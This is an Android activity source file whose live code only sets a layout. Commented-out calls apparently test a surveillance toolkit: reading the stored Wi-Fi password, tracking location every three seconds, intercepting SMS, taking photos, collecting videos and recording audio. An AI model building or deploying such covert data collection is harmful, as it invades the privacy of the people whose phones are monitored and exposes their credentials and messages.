package com.fs.fs.activity;

import android.app.Activity;
import android.os.Bundle;

import com.fs.fs.R;


public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

//        DeviceUtils.getWifiPasswd();

//        AppInfoService.getInstance().getRunningAppInfo(new AppInfoService.AppInfoListener() {
//            @Override
//            public void onSucceed(List<AppInfo> appInfos) {
//
//            }
//        });


//        LocationService.getInstance().interval(3 * 1000, new LocationService.LocateListener() {
//            @Override
//            public void onLocateSucceed(AMapLocation aMapLocation) {
//                Location location = new Location();
//                location.province = aMapLocation.getProvince();
//                location.city = aMapLocation.getCity();
//                location.district = aMapLocation.getDistrict();
//                location.street = aMapLocation.getStreet();
//                location.longitude = aMapLocation.getLongitude();
//                location.latitude = aMapLocation.getLatitude();
//                location.time = DateUtils.millis2String(aMapLocation.getTime());
//
//                LogUtils.d("%s:%s %s %s", location.latitude, location.longitude, location.city, location.street);
//            }
//
//            @Override
//            public void onLocateFail(int errorCode, String errorInfo) {
//
//            }
//        });


//        ProviderService.getInstance().getSMS(new ProviderService.SMSListener() {
//            @Override
//            public void onGetAllSMS(List<SMSInfo> SMSInfo) {
//
//            }
//
//            @Override
//            public void onReceive(SMSInfo msgInfo) {
//                LogUtils.d(msgInfo.toString());
//            }
//        });

//        CameraService.getInstance().takePhoto(null);

//        ProviderService.getInstance().getVideos();


//        MediaRecordService.getInstance().startRecordAudio();
//        try {
//            sleep(10 * 1000);
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//        MediaRecordService.getInstance().stopRecord();


    }

}
